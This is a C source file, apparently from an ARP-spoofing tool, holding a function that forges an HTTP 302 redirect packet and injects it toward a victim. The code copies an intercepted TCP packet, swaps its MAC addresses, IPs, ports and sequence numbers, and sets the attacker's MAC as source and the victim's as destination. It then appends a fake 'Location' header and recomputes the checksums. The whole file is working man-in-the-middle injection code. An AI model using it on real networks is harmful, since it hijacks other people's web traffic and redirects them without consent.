#include "arpSpoofing.h"
#include <string.h>
int swapMAC(PETHERNET_HEADER eth);
int swapIP2(u_char* src, u_char* dst);
int swapPort(u_short* src, u_short* dst);
int swapSeqAck(u_int* seq, u_int* ack);

int packet302Redirect(u_char* sendPacket, const u_char* packet)
{
	PETHERNET_HEADER eh;
	PIP_HEADER ih;
	PTCP_HEADER th;
	const char msgBackward[128] = "HTTP/1.1 302 Found\r\nLocation: http://en.wikipedia.org/wiki/HTTP_302\r\n";
	u_short msgBackwardLen = (u_short)strlen(msgBackward);
	/* copy */
	memcpy(sendPacket, packet, TCP_PACKET_SIZE);
	eh = (PETHERNET_HEADER)sendPacket;
	ih = (PIP_HEADER)(sendPacket + ETHERNET_HEADER_SIZE);
	th = (PTCP_HEADER)((char*)ih + IP_HEADER_SIZE);
	memcpy((char*)th + TCP_HEADER_SIZE, msgBackward, msgBackwardLen);
	/* swap */
	swapMAC(eh);
	swapIP2(ih->sourceIP, ih->destinationIP);
	swapPort(&th->sourcePort, &th->destinationPort);
	swapSeqAck(&th->seq, &th->ack);
	/* set header */
	ih->ttl = 128;
	th->ack = htonl(ntohl(th->ack) + ntohs(ih->totalLen) - IP_HEADER_SIZE - TCP_HEADER_SIZE);
	ih->totalLen = htons(IP_HEADER_SIZE + TCP_HEADER_SIZE + msgBackwardLen);
	th->flags = TH_FIN | TH_ACK;
	th->window = 0;
	/* set checksum */
	ih->checksum = checksum_ip(ih);
	th->checksum = checksum_tcp(ih, th, TCP_HEADER_SIZE + msgBackwardLen);  
	printf("backward end\n");
	return msgBackwardLen + TCP_PACKET_SIZE;
}
int swapMAC(PETHERNET_HEADER eh)
{
	memcpy(eh->src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
	memcpy(eh->dst_MAC, LanInfo->victimMAC, sizeof(u_char) * MACLEN);
	return 0;
}
int swapIP2(u_char* src, u_char* dst)
{
	u_char temp[4];
	memcpy(temp, dst, 4);
	memcpy(dst, src, 4);
	memcpy(src, temp, 4);
	return 0;
}
int swapPort(u_short * src, u_short * dst)
{
	u_short temp = *src;
	*src = *dst;
	*dst = temp;
	return 0;
}
int swapSeqAck(u_int* seq, u_int* ack)
{
	u_int temp = *seq;
	*seq = *ack;
	*ack = temp;
	return 0;
}